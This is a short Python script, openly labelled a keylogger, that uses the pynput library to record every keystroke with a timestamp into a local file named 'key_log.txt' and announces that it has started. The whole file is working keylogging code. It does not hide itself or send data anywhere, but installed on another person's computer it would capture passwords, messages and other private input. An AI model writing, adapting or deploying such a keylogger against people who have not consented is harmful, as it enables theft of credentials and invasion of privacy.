
from pynput import keyboard
import logging

# Log file name
log_file = "key_log.txt"

# Log configuration
logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s: %(message)s")

def on_press(key):
    try:
        logging.info(f"Key Pressed: {key.char}")
        
    except AttributeError:
        logging.info(f"Special Key: {key}")

# Start listening
with keyboard.Listener(on_press=on_press) as listener:
    print(f"[+] Keylogger started... Logging keys to '{log_file}'")
    listener.join()
